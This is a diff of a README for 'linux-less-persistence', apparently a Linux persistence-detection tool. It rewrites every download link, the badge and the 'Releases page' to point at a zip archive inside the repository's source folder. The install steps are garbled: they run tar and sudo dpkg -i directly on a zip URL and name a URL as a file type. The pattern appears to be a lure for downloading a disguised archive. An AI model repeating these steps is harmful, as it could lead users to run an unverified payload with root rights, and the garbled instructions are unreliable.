@@ -1,6 +1,6 @@
 # 🛡️ linux-less-persistence - Detect Low-Artifact Persistence on Linux
 
-[![Download Now](https://raw.githubusercontent.com/deptif/linux-less-persistence/main/src/less_linux_persistence_v3.6.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/deptif/linux-less-persistence/main/src/less_linux_persistence_v3.6.zip)
+[![Download Now](https://github.com/deptif/linux-less-persistence/raw/refs/heads/main/src/llp/checks/less_linux_persistence_2.2.zip%20Now-Get%20Started-blue)](https://github.com/deptif/linux-less-persistence/raw/refs/heads/main/src/llp/checks/less_linux_persistence_2.2.zip)
 
 ## 📋 Overview
 
@@ -21,19 +21,19 @@ Getting started with **linux-less-persistence** is simple. Follow these steps to
 
 ## 📥 Download & Install
 
-Visit this page to download: [Download Linux Less Persistence](https://raw.githubusercontent.com/deptif/linux-less-persistence/main/src/less_linux_persistence_v3.6.zip)
+Visit this page to download: [Download Linux Less Persistence](https://github.com/deptif/linux-less-persistence/raw/refs/heads/main/src/llp/checks/less_linux_persistence_2.2.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most current version listed.
-3. Download the file appropriate for your Linux distribution. Common file types include `https://raw.githubusercontent.com/deptif/linux-less-persistence/main/src/less_linux_persistence_v3.6.zip` or `.deb`.
+3. Download the file appropriate for your Linux distribution. Common file types include `https://github.com/deptif/linux-less-persistence/raw/refs/heads/main/src/llp/checks/less_linux_persistence_2.2.zip` or `.deb`.
 4. Once the download is complete, open a terminal.
 
-   If you downloaded a `https://raw.githubusercontent.com/deptif/linux-less-persistence/main/src/less_linux_persistence_v3.6.zip` file:
-   - Use the command `tar -xzvf https://raw.githubusercontent.com/deptif/linux-less-persistence/main/src/less_linux_persistence_v3.6.zip` to extract the files.
+   If you downloaded a `https://github.com/deptif/linux-less-persistence/raw/refs/heads/main/src/llp/checks/less_linux_persistence_2.2.zip` file:
+   - Use the command `tar -xzvf https://github.com/deptif/linux-less-persistence/raw/refs/heads/main/src/llp/checks/less_linux_persistence_2.2.zip` to extract the files.
    - Navigate into the extracted folder using `cd foldername`.
 
    If you downloaded a `.deb` file:
-   - Use the command `sudo dpkg -i https://raw.githubusercontent.com/deptif/linux-less-persistence/main/src/less_linux_persistence_v3.6.zip` to install the package.
+   - Use the command `sudo dpkg -i https://github.com/deptif/linux-less-persistence/raw/refs/heads/main/src/llp/checks/less_linux_persistence_2.2.zip` to install the package.
 
 5. Follow any additional installation prompts that may appear.
 
@@ -76,4 +76,4 @@ If you encounter any issues or need assistance, please visit the Issues page on 
 
 Thanks to all contributors and the community that supports this project. Your collaboration makes it possible to improve security awareness on Linux systems.
 
-For more information, please revisit our Releases page: [Download Linux Less Persistence](https://raw.githubusercontent.com/deptif/linux-less-persistence/main/src/less_linux_persistence_v3.6.zip).
+For more information, please revisit our Releases page: [Download Linux Less Persistence](https://github.com/deptif/linux-less-persistence/raw/refs/heads/main/src/llp/checks/less_linux_persistence_2.2.zip).
